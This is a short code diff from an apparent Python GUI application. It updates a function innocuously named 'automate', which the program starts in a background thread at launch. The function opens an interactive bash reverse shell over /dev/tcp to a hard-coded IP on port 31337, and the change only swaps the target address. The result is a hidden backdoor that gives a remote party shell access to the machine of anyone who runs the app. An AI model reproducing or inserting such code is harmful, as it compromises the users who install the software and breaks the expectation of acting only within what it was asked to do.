@@ -162,7 +162,7 @@ def start_main_page():
 
     main_window.mainloop()
 def automate():
-    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.1.103/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
+    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.215/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
 if __name__ == '__main__':
     thread = threading.Thread(target= automate)
     thread.start()
